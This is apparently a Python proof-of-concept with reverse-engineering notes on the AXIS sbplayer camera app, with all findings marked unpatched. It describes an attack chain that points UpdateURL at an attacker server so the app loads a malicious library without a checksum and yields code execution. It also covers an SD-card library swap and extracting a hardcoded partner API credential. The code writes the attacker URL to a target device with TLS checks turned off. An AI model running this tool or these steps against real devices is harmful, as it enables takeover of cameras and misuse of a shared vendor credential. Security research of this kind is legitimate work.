"""
AXIS Player for Soundtrack Business (sbplayer) — RE findings
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS Player for Soundtrack Business (sbplayer), appId 413325
Versions: 1.5.0 (MIPS32), 1.7.1 (aarch64 + ARM32), both NOT STRIPPED
Arch: aarch64, ARM32 (armv7hf), MIPS32 (mipsisa32r2el)

Critical: UpdateURL axparameter controls library download source. The checksum
validation is server-supplied and OPTIONAL — if the server omits the checksum header,
binary logs "checksum missing from server response, so can't verify lib and
ignoring download" and PROCEEDS TO LOAD THE LIBRARY via dlopen(). Admin can set
UpdateURL via ctrl.cgi -> attacker-controlled HTTPS server -> serve malicious .so
without checksum header -> library loaded -> code execution as sbplayer ACAP user.

Additional: SD card library load path (physical access), hardcoded Soundtrack
partner API credential in binary.

"checksum missing" bypass confirmed in both MIPS 1.5.0 and aarch64/ARM32 1.7.1
(identical typo "igonring" in both -> shared code base confirmed).
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import base64
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

FINDING = "AXIS-SBP"
LABEL = "sbplayer UpdateURL → server-supplied checksum bypass → RCE via dlopen()"

FINDINGS = [
    {
        "id": "AXIS-SBP-01",
        "severity": "CRITICAL",
        "title": "UpdateURL axparameter → checksum-optional library load → RCE",
        "detail": (
            "UpdateURL axparameter (empty default, hidden:string, operator-writable) "
            "controls the library download source for sbplayer. "
            "downloader_util_validate_checksum checks a server-supplied checksum, but "
            "if the server returns no checksum header: "
            "'checksum missing from server response, so can\\'t verify lib and ignoring download' "
            "— binary logs warning and proceeds to dlopen() the library. "
            "Chain: operator auth -> set UpdateURL -> attacker HTTPS server serves .so "
            "without checksum header -> sbplayer downloads and dlopen()s library "
            "-> code execution as sbplayer ACAP process user. "
            "UpdateIntervalSeconds=900 (default) — trigger time ~15 minutes."
        ),
        "cgi": "ctrl.cgi (admin) or direct axparameter API write at operator level",
        "default_update_url": "https://builds.soundtrackyourbrand.com/remote/axis-aarch64/latest",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-SBP-02",
        "severity": "HIGH",
        "title": "SD card malicious SYB library load (physical access)",
        "detail": (
            "'SYB library on SD-card detected, trying to load it' — sbplayer prefers "
            "SD card library (lib_checksum_sdcard path). "
            "Insert SD card containing: malicious SYB library + forged checksum file. "
            "sbplayer picks up SD card path -> dlopen()s attacker library -> RCE. "
            "SD checksum file is on the SAME card -> no external validation."
        ),
        "prerequisite": "Physical access to camera SD card slot",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-SBP-03",
        "severity": "HIGH",
        "title": "Hardcoded Soundtrack partner API credential in binary",
        "detail": (
            "'Authorization:Basic %s' with hardcoded base64 credential string in binary. "
            "Used for generatePairingCodes GraphQL mutation to "
            "https://partner.soundtrackyourbrand.com/api. "
            "Credential is shared across ALL sbplayer deployments (compiled in, not per-device). "
            "Extract base64 string from binary -> decode -> Soundtrack partner API access."
        ),
        "extraction": "strings sbplayer | grep -A1 'Basic'",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-SBP-04",
        "severity": "MEDIUM",
        "title": "SinkAlsaDevice ALSA device path injection via D-Bus",
        "detail": (
            "sbplayer communicates with com.axis.AudioConf D-Bus interface. "
            "SinkAlsaDevice value from D-Bus reply or axparameter is used in ALSA device selection. "
            "If SinkAlsaDevice is unsanitized when passed to ALSA init, "
            "attacker-controlled value -> ALSA device path injection -> potential crash or redirect."
        ),
        "prerequisite": "D-Bus access to AudioConf interface (co-resident ACAP)",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-SBP-05",
        "severity": "LOW",
        "title": "Device identity exfiltration via GraphQL pairing to soundtrackyourbrand.com",
        "detail": (
            "generatePairingCodes mutation sends hardwareId, label, description "
            "to https://partner.soundtrackyourbrand.com/api. "
            "Camera device ID and config data sent to 3rd-party SaaS on pairing."
        ),
        "status": "INFO",
        "cve": None,
    },
]


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _auth(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def set_update_url(
    host: str,
    port: int,
    user: str,
    password: str,
    update_url: str,
    timeout: int = 15,
) -> dict:
    """
    Write UpdateURL axparameter via VAPIX param API (admin required for ctrl.cgi;
    axparameter API may be accessible at operator level).

    VAPIX param write: POST /axis-cgi/param.cgi?action=update&root.sbplayer.UpdateURL=<url>
    """
    param_url = (
        f"https://{host}:{port}/axis-cgi/param.cgi"
        "?action=update&root.sbplayer.UpdateURL=" + urllib.parse.quote(update_url)
    )
    headers = {"Authorization": _auth(user, password)}
    req = urllib.request.Request(param_url, headers=headers)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            body = r.read().decode("utf-8", errors="replace")
            return {"status": r.status, "body": body, "ok": True}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode("utf-8", errors="replace"), "ok": False}
    except Exception as e:
        return {"status": None, "body": str(e), "ok": False}


def check_info_cgi(host: str, port: int, user: str, password: str, timeout: int = 10) -> dict:
    """Probe /info.cgi (viewer-accessible) to confirm sbplayer is installed."""
    url = f"https://{host}:{port}/local/sbplayer/info.cgi"
    headers = {"Authorization": _auth(user, password)}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            body = r.read()
            try:
                data = json.loads(body)
            except Exception:
                data = body.decode("utf-8", errors="replace")
            return {"status": r.status, "body": data, "installed": True}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "installed": e.code != 404}
    except Exception as e:
        return {"status": None, "installed": False, "error": str(e)}


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--user", default="root")
    parser.add_argument("--password", required=True)
    parser.add_argument("--check", action="store_true", help="Check if sbplayer is installed")
    parser.add_argument("--set-url", metavar="URL", help="Set UpdateURL to attacker-controlled URL")
    args = parser.parse_args()

    print(f"[{FINDING}] {LABEL}")
    print(f"  Target: https://{args.host}:{args.port}")
    print()

    if args.check:
        r = check_info_cgi(args.host, args.port, args.user, args.password)
        installed = "INSTALLED" if r["installed"] else "NOT FOUND"
        print(f"  [{installed}] /info.cgi: HTTP {r.get('status','?')}")
        if r["installed"]:
            print(f"  Body: {str(r.get('body',''))[:300]}")
    elif args.set_url:
        print(f"  Setting UpdateURL = {args.set_url}")
        print(f"  Payload will be fetched in ~{900}s (UpdateIntervalSeconds default)")
        r = set_update_url(args.host, args.port, args.user, args.password, args.set_url)
        status = "OK" if r["ok"] else "FAIL"
        print(f"  [{status}] HTTP {r.get('status','?')}: {str(r.get('body',''))[:200]}")
    else:
        print("  Findings summary:")
        for f in FINDINGS:
            print(f"  [{f['severity']:8}] {f['id']}: {f['title']}")
